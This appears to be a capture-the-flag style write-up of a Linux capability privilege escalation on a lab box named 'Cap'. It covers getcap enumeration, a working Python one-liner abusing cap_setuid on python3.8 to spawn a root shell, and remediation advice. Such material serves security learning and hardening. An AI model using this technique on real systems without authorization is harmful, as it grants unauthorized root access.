# Cap — Linux Capability Privilege Escalation

## Enumeration

From the `nathan` shell, the following command was used to recursively identify files with capabilities while suppressing permission errors:

```bash
getcap -r / 2>/dev/null
```

Relevant output:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

## Why Python was significant

The capability `cap_setuid` permits a process to change its user ID. In this lab, the capability was assigned to `/usr/bin/python3.8`, creating a path from the low-privileged account to UID 0.

The `+eip` suffix describes the capability flags: effective, inheritable, and permitted. The effective flag means the capability is available to the executable while it runs, subject to Linux capability semantics.

## Exploitation demonstrated in the lab

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Then verify the result:

```bash
id
whoami
```

The observed output included:

```text
uid=0(root)
```

The group ID remained `nathan` in the session, but UID 0 confirmed root user identity for the process.

## Remediation

- Remove unnecessary file capabilities from interpreters and other general-purpose executables.
- Audit capabilities regularly with `getcap -r /`.
- Apply least privilege and verify ownership/permissions of executable files.
- Monitor unexpected UID changes and shell spawning from scripting runtimes.

## Safety note

Use capability-abuse techniques only in authorized labs or explicitly approved assessments.
